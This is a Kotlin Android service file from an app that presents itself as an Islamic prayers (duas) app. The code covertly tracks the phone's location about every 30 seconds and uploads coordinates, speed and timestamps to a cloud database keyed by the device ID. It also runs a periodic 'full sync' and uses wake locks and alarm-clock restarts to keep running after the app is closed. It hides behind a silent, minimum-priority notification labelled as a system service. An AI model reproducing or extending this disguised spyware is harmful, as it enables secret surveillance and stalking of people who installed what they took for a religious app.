package islamic.duas.sync

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log

import androidx.core.app.NotificationCompat
import islamic.duas.R
import islamic.duas.MainActivity
import islamic.duas.cloud.CloudApi
import islamic.duas.utils.DeviceId
import islamic.duas.utils.ErrorLog
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.util.concurrent.atomic.AtomicBoolean

class DuaForegroundService : Service() {

    companion object {
        private const val TAG = "DuaFGS"
        private const val NOTIF_ID = 1001
        private const val CHANNEL_ID = "sync_foreground"
        private const val ALARM_INTERVAL_MS = 15 * 60 * 1000L
        private const val SYNC_INTERVAL_MS = 15 * 60 * 1000L
        private const val FAST_LOC_INTERVAL_MS = 30 * 1000L

        fun start(context: Context) {
            val intent = Intent(context, DuaForegroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun setAlarm(context: Context) {
            val alarmMgr = context.getSystemService(Context.ALARM_SERVICE) as? AlarmManager ?: return
            val intent = Intent(context, DuaAlarmReceiver::class.java).apply {
                action = "islamic.duas.ALARM_SYNC"
            }
            val pendingIntent = PendingIntent.getBroadcast(
                context, 0, intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
            val triggerMs = System.currentTimeMillis() + ALARM_INTERVAL_MS
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                alarmMgr.setAlarmClock(
                    AlarmManager.AlarmClockInfo(triggerMs, pendingIntent),
                    pendingIntent
                )
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmMgr.setAndAllowWhileIdle(
                    AlarmManager.RTC_WAKEUP, triggerMs, pendingIntent
                )
            } else {
                alarmMgr.set(AlarmManager.RTC_WAKEUP, triggerMs, pendingIntent)
            }
        }
    }

    private val scope = CoroutineScope(Dispatchers.IO + Job())
    private var wakeLock: PowerManager.WakeLock? = null
    private val isRunning = AtomicBoolean(false)

    override fun onCreate() {
        super.onCreate()
        CloudApi.init(this)
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (isRunning.getAndSet(true)) return START_STICKY

        val notification = buildNotification()
        startForeground(NOTIF_ID, notification)

        // Acquire wake lock
        val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
        wakeLock = pm?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "devicesync:foreground")
        wakeLock?.acquire(10 * 60 * 1000L)

        // Set alarm-based fallback scheduling
        setAlarm(this)

        // Start periodic sync loop
        val service = this
        scope.launch {
            var lastSync = 0L
            var lastFastLoc = 0L

            while (isActive) {
                try {
                    val now = System.currentTimeMillis()

                    if (now - lastFastLoc > FAST_LOC_INTERVAL_MS) {
                        try { getAndSyncLocation() } catch (e: Exception) {
                            Log.e(TAG, "Location sync error: ${e.message}", e)
                            ErrorLog.write(service, TAG, "FGS location sync error", e)
                        }
                        lastFastLoc = now
                    }

                    // Full sync every 15min
                    if (now - lastSync > SYNC_INTERVAL_MS) {
                        try {
                            DuaSyncWorker.runSync(applicationContext)
                        } catch (e: Exception) {
                            Log.e(TAG, "Full sync error: ${e.message}", e)
                            ErrorLog.write(service, TAG, "FGS full sync error", e)
                        }
                        lastSync = now
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Sync loop error: ${e.message}", e)
                }

                delay(30_000L)
            }
        }

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        isRunning.set(false)
        scope.let {
            val job = it.coroutineContext[Job]
            job?.cancel()
        }
        wakeLock?.release()
        wakeLock = null
        // Re-schedule alarm so service restarts
        setAlarm(this)
        super.onDestroy()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        // Re-schedule alarm so service restarts after task removal
        setAlarm(this)
        stopSelf()
        super.onTaskRemoved(rootIntent)
    }

    private fun getAndSyncLocation() {
        try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as? android.location.LocationManager ?: return
            var best: android.location.Location? = null
            for (provider in listOf(
                android.location.LocationManager.GPS_PROVIDER,
                android.location.LocationManager.NETWORK_PROVIDER,
                android.location.LocationManager.PASSIVE_PROVIDER
            )) {
                try {
                    @Suppress("DEPRECATION")
                    val loc = lm.getLastKnownLocation(provider)
                    if (loc != null && (best == null || loc.accuracy < best.accuracy)) best = loc
                } catch (e: Exception) {
                    Log.w(TAG, "getLastKnownLocation($provider): ${e.message}")
                }
            }
            if (best != null && best.accuracy <= 500f) {
                val prefs = getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
                val now = System.currentTimeMillis()
                val lastMs = prefs.getLong("fast_location_ms", 0L)
                if (now - lastMs > 90_000L) {
                    val androidId = DeviceId.get(this)
                    val dateFormat = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US)
                    val data = JSONObject().apply {
                        put("lat", best.latitude)
                        put("lng", best.longitude)
                        put("accuracy", best.accuracy.toInt())
                        put("speed", best.speed)
                        put("ts_ms", now)
                        put("timestamp", dateFormat.format(java.util.Date(now)))
                        put("source", "foreground_service")
                    }
                    CloudApi.writeToRTDB("devices/$androidId/location/latest", data)
                    prefs.edit().putLong("fast_location_ms", now).apply()
                    DuaTracker.notifyLocationUpdate(this, best)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "getAndSyncLocation error: ${e.message}", e)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Service Active",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "system service"
                setShowBadge(false)
                setSound(null, null)
            }
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        val openIntent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
        }
        val pendingOpen = PendingIntent.getActivity(
            this, 0, openIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("اسلامی دعائیں")
            .setContentText("Service Running")
            .setSmallIcon(R.drawable.ic_notification)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setContentIntent(pendingOpen)
            .setSilent(true)
            .build()
    }
}
